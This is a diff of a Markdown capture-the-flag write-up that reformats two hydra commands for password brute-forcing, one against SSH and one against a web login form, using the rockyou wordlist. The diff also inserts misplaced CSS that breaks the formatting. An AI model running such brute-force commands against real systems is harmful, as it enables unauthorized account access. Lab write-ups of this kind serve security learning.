@@ -66,17 +66,22 @@ Unsuccessfully, I did try using the username found in the HTML source of the mai
 
 #### SSH
 
-> ```bash
-> hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt ssh://xxx.xxx.xxx.xxx
-> ```
+```bash
+hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt ssh://xxx.xxx.xxx.xxx
+```code {
+  white-space : pre-wrap !important;
+}
 
 *See: [hydra.ssh.log](hydra.ssh.log)*
 
 #### HTTP
 
-> ```bash
-> hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt xxx.xxx.xxx.xxx http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
-> ```
+```bash
+hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt xxx.xxx.xxx.xxx http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
+```
+code {
+  white-space : pre-wrap !important;
+}
 
 *See: [hydra.web.log](hydra.web.log)*
 
